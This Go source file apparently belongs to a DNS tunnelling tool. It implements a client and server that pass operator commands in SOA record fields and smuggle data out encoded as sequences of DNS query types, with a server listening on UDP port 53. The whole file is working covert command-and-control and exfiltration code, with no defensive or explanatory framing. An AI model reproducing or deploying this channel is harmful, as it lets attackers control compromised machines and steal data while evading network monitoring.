package protocol

import (
	"fmt"
	"time"

	"github.com/kek/pek/internal/codec"
	"github.com/miekg/dns"
)

type QtypeProtoClient struct {
	codec    codec.Codec[uint16]
	resolver string
	domain   string
	delay    time.Duration
}

func NewQtypeProtoClient(resolver string, domain string, delay time.Duration) *QtypeProtoClient {
	return &QtypeProtoClient{
		codec:    codec.NewQtypeCodec(),
		resolver: resolver,
		domain:   domain,
		delay:    delay,
	}
}

func (proto *QtypeProtoClient) FetchCmd() (string, error) {
	cmdResponse, err := proto.resolve(dns.TypeSOA)
	if err != nil {
		return "", err
	}

	if len(cmdResponse) == 1 {
		if cmdRecord, ok := cmdResponse[0].(*dns.SOA); ok {
			decoded, err := proto.codec.DecodeCmd(cmdRecord.Ns)
			if err != nil {
				return "", fmt.Errorf("Unexpected content of SOA record")
			}

			return string(decoded), nil
		} else {
			return "", fmt.Errorf("Unexpected response instead of SOA record")
		}
	}

	return "", fmt.Errorf("Unexpected amount of DNS answers")
}

func (proto *QtypeProtoClient) Send(data []byte) error {
	encodedData := proto.codec.Encode(data)
	counter := 0
	for i, part := range encodedData {
		fmt.Printf("Sending: %v ... ", part)
		for {
			time.Sleep(proto.delay)

			answer, err := proto.resolve(part)
			if err != nil {
				continue
			}

			counter++

			if len(answer) > 0 {
				if answer[0].Header().Rrtype == part && answer[0].Header().Ttl == uint32(i+1) {
					fmt.Printf("OK\n")
					break
				}
			}
		}
	}
	fmt.Printf("Done in %d requests.\n\n", counter)

	return nil
}

func (proto *QtypeProtoClient) resolve(qtype uint16) ([]dns.RR, error) {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(proto.domain), qtype)
	m.RecursionDesired = true

	c := &dns.Client{Timeout: 1 * time.Second}

	response, _, err := c.Exchange(m, proto.resolver)
	if err != nil {
		return nil, err
	}

	return response.Answer, nil
}

type QtypeProtoServer struct {
	codec     codec.Codec[uint16]
	cmd       string
	listening bool
	buf       []uint16
	c         chan []byte
}

func NewQtypeProtoServer() *QtypeProtoServer {
	return &QtypeProtoServer{
		codec: codec.NewQtypeCodec(),
		c:     make(chan []byte, 10),
	}
}

func (proto *QtypeProtoServer) serverHandler(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	qtype := r.Question[0].Qtype
	switch qtype {
	case dns.TypeSOA:
		msg.Answer = append(msg.Answer, &dns.SOA{
			Hdr:     dns.RR_Header{Name: r.Question[0].Name, Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 0},
			Ns:      proto.codec.EncodeCmd(proto.cmd),
			Mbox:    "kek.pek.",
			Serial:  3,
			Refresh: 1,
			Retry:   3,
			Expire:  3,
			Minttl:  7,
		})

		if proto.cmd != "" {
			fmt.Println("Command received")
		}
	default:
		chunk := qtype

		if chunk == proto.codec.GetPrologue() {
			fmt.Printf("Receiving data")
			proto.buf = nil
		}

		proto.buf = append(proto.buf, chunk)
		fmt.Printf(".")

		if chunk == proto.codec.GetEpilogue() {
			fmt.Printf("\n\n")

			decoded, err := proto.codec.Decode(proto.buf)
			if err != nil {
				fmt.Printf("Error decoding response: %s", err)
			}

			proto.cmd = ""
			proto.c <- decoded
		}

		msg.Answer = append(msg.Answer, &dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: qtype,
			Class:  dns.ClassINET,
			Ttl:    uint32(len(proto.buf)),
		})

	}

	w.WriteMsg(msg)
}

func (proto *QtypeProtoServer) Serve() error {
	mux := dns.NewServeMux()
	mux.HandleFunc(".", proto.serverHandler)

	server := &dns.Server{
		Addr:    ":53",
		Net:     "udp",
		UDPSize: 512,
		Handler: mux,
	}

	return server.ListenAndServe()
}

func (proto *QtypeProtoServer) SendCmd(cmd string) {
	proto.cmd = cmd
}

func (proto *QtypeProtoServer) FetchData() []byte {
	return <-proto.c
}
